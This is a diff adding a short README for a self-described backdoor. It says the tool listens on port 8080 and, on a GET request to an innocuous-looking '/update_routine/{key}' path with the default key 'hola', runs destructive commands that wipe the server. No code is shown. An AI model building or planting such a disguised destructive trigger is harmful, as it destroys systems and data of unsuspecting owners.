@@ -1,0 +1,2 @@
+# Just a simple backdor
+It hosts a route on the port 8080 of the machine the binary is located at. If a get request to "/update_routine/{key}" is done, the server gets nuked (It runs all the bad commands I could think of). The default key is "hola"
